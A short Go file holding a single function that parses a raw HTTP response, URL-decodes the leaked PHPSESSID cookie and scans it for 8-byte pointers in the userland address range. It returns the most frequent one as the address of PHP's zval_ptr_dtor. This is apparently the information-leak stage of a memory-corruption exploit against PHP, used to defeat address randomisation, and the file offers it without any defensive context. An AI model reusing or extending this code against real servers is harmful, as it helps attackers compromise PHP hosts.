package main

import (
	"bytes"
	"encoding/binary"
	"net/url"
)

func parseLeak(resp []byte) uint64 {
	i := bytes.Index(resp, []byte("Set-Cookie: PHPSESSID="))
	rest := resp[i+len("Set-Cookie: PHPSESSID="):]
	end := bytes.Index(rest, []byte("\r\n"))
	decoded, _ := url.QueryUnescape(string(rest[:end]))
	counts := map[uint64]int{}
	var best uint64
	for off := 0; off+8 <= len(decoded); off += 8 {
		q := binary.LittleEndian.Uint64([]byte(decoded[off:]))
		if q >= 0x7f0000000000 && q <= 0x7fffffffffff {
			counts[q]++
			if counts[q] > counts[best] {
				best = q
			}
		}
	}
	zval_ptr_dtor := best
	return zval_ptr_dtor
}
